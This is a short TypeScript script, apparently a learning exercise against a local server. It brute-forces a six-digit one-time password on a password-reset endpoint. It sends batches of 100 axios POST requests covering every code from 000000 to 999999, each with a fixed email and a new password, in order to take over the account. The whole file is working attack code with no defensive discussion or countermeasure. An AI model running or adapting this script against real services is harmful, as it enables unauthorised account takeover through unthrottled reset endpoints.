import axios from "axios";

async function sendRequest(otp:string){
try{
    await   axios.post("http://localhost:3000/reset-password",{otp:otp,email:"akshat@gmail.com",newPassword:"randomgig"})

}
catch(e){
    //console.log(e);
}

}

sendRequest("123456");


//sending request in batches because if we send all thousands of request together our process will ran out of memory
async function main(){
    //for loop to send request from 0 to 100 to 200, in form of 100 batch
    for(let i =0;i<=999999;i+=100){
        const p = [];
        //here we are sending 100 request at once and waiting it to complete
        for(let j = 0 ; j<100; j++){
            console.log(i);
           p.push(sendRequest((i+j).toString()));
        }
        //here waiting for all 100 request to complete
        await Promise.all(p);
    }
}

main();